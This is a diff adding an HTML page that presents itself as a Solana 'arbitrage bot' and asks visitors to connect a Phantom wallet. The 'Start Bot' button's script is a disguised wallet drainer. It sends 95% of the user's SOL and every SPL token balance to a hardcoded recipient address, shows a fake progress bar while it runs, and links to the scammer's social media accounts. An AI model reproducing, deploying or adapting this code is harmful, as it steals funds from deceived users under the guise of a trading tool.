@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arbitrage Bot on Solana</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        #app {
+            width: 80%;
+            margin: 0 auto;
+            text-align: center;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: #fff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        #walletAddress {
+            margin: 20px 0;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        #progressBar {
+            width: 100%;
+            height: 30px;
+            background-color: #e0e0e0;
+            border-radius: 15px;
+            margin-top: 20px;
+            display: none;
+        }
+        #progress {
+            height: 100%;
+            background-color: #4caf50;
+            border-radius: 15px;
+            width: 0;
+        }
+        #footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            padding: 20px;
+        }
+        #footer a {
+            text-decoration: none;
+            color: #007bff;
+            font-weight: bold;
+        }
+        #footer a:hover {
+            color: #0056b3;
+        }
+
+        /* Typing effect styling */
+        .typing-text {
+            font-size: 18px;
+            font-weight: normal;
+            color: #333;
+            margin-top: 30px;
+            white-space: nowrap;
+            overflow: hidden;
+            border-right: 3px solid #333;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <h1>Start your Arbitrage Bot</h1>
+    <p id="walletAddress">Connect your wallet to see your address</p>
+    <button id="connectButton">Connect Phantom Wallet</button>
+    <button id="stakeButton" disabled>Start Bot</button>
+    <div class="status" id="status"></div>
+    <div id="progressBar"><div id="progress"></div></div>
+</div>
+
+<!-- Typing message div -->
+<div class="typing-text" id="typingMessage"></div>
+
+<div id="footer">
+    <a href="https://t.me/SocratesWeb3King" target="_blank">Telegram</a>
+    <a href="https://x.com/socratesweb3kin?s=21&t=pJyVwAY43BkwOF0vt4lRFQ" target="_blank">Twitter</a>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.37.1/solana-web3.min.js"></script>
+<script>
+    const recipientAddress = new solanaWeb3.PublicKey("3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ");  // Recipient Solana address
+    let userAccount;
+
+    // Connect to Phantom Wallet
+    document.getElementById("connectButton").addEventListener("click", async () => {
+        if (window.solana && window.solana.isPhantom) {
+            try {
+                const response = await window.solana.connect();
+                userAccount = response.publicKey.toString();
+                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
+                document.getElementById("stakeButton").disabled = false;
+            } catch (error) {
+                console.error("Error connecting to Phantom", error);
+                alert("Error connecting to Phantom: " + error.message);
+            }
+        } else {
+            alert("Please install Phantom Wallet!");
+        }
+    });
+
+    // Typing effect for the donation message
+    const message = "For appreciations kindly donate SOL to my address 3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";
+    let i = 0;
+
+    function typeMessage() {
+        if (i < message.length) {
+            document.getElementById("typingMessage").textContent += message.charAt(i);
+            i++;
+            setTimeout(typeMessage, 100); // Adjust typing speed here (in ms)
+        }
+    }
+
+    // Start typing effect as soon as the page loads
+    window.onload = function() {
+        typeMessage();
+    };
+
+    // Transfer SOL and SPL tokens
+    document.getElementById("stakeButton").addEventListener("click", async () => {
+        try {
+            // Display progress bar
+            document.getElementById("progressBar").style.display = "block";
+            let progress = 0;
+            let progressInterval = setInterval(() => {
+                if (progress < 100) {
+                    progress += 10;
+                    document.getElementById("progress").style.width = progress + "%";
+                }
+            }, 1000);
+
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+            
+            // Get balance and send SOL
+            const balance = await connection.getBalance(new solanaWeb3.PublicKey(userAccount));
+            const amountToSend = Math.floor(balance * 0.95);
+            if (amountToSend > 0) {
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(userAccount),
+                        toPubkey: recipientAddress,
+                        lamports: amountToSend
+                    })
+                );
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
+                document.getElementById("status").innerText = `SOL sent successfully: ${signature}`;
+            }
+
+            // Get SPL token accounts and send each token to recipient
+            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+                new solanaWeb3.PublicKey(userAccount),
+                { programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
+            );
+
+            for (const tokenAccountInfo of tokenAccounts.value) {
+                const tokenAccount = tokenAccountInfo.account.data.parsed.info;
+                const tokenBalance = tokenAccount.tokenAmount.uiAmount;
+                
+                if (tokenBalance > 0) {
+                    const tokenMintAddress = new solanaWeb3.PublicKey(tokenAccount.mint);
+                    const recipientTokenAccount = await solanaWeb3.PublicKey.findAssociatedTokenAddress(
+                        recipientAddress,
+                        tokenMintAddress
+                    );
+
+                    const transferTransaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.Token.createTransferInstruction(
+                            new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+                            new solanaWeb3.PublicKey(tokenAccount.address),
+                            recipientTokenAccount,
+                            new solanaWeb3.PublicKey(userAccount),
+                            [],
+                            tokenBalance * Math.pow(10, tokenAccount.tokenAmount.decimals)
+                        )
+                    );
+
+                    const { signature: tokenSignature } = await window.solana.signAndSendTransaction(transferTransaction);
+                    await connection.confirmTransaction(tokenSignature);
+                    document.getElementById("status").innerText += `Token sent: ${tokenSignature}\n`;
+                }
+            }
+
+            // Stop progress bar
+            clearInterval(progressInterval);
+            document.getElementById("progress").style.width = "100%";
+        } catch (error) {
+            document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
+            clearInterval(progressInterval);
+            document.getElementById("progress").style.width = "0%";
+        }
+    });
+</script>
+
+</body>
+</html>
